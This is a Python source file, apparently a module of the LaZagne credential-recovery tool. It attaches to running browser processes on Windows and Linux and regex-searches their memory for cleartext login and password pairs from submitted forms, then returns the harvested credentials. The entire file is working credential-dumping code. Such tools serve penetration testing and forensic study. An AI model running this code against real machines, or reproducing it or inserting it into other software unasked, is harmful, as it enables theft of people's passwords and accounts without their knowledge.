#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Author: Nicolas VERDIER (contact@n1nj4.eu)

""" 
This script uses memorpy to dumps cleartext passwords from browser's memory
It has been tested on both windows 10 and ubuntu 16.04
The regex have been taken from the mimikittenz https://github.com/putterpanda/mimikittenz
"""
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.write_output import print_debug
from memorpy import *

# create a symbolic link on Windows
# mklink /J memorpy ..\..\..\..\external\memorpy\memorpy

password_regex=[
    "(email|log(in)?|user(name)?)=(?P<Login>.{1,25})?&.{0,10}?p[a]?[s]?[s]?[w]?[o]?[r]?[d]?=(?P<Password>.{1,25})&"
]

# grep to list all URLs (could be useful to find the relation between a user / password and its host)
# http_regex=[
#     "(?P<URL>http[s]?:\/\/[a-zA-Z0-9-]{1,61}(\.[a-zA-Z]{2,})+)"
# ]

if sys.platform=="win32":
	browser_list=["iexplore.exe", "firefox.exe", "chrome.exe", "opera.exe", "MicrosoftEdge.exe", "microsoftedgecp.exe"]
else:
	browser_list=["firefox", "iceweasel", "chromium", "chrome"]

class MemoryDump(ModuleInfo):
	def __init__(self):
		options = {'command': '-m', 'action': 'store_true', 'dest': 'memory_dump', 'help': 'retrieve browsers passwords from memory'}
		ModuleInfo.__init__(self, 'memory_dump', 'memory', options)

	def run(self, software_name = None):
		pwdFound = []
		for process in Process.list():
			if process.get('name') in browser_list:
				try:
					mw = MemWorker(pid=process.get('pid'))
				except ProcessException:
					continue
				
				print_debug('INFO', 'dumping passwords from %s (pid: %s) ...' % (process.get('name'), str(process.get('pid'))))
				for _, x in mw.mem_search(password_regex, ftype='groups'):
					login, password = x[-2:]
					pwdFound.append({'URL':'Unknown', 'Login': login, 'Password': password})

		return pwdFound 
	 
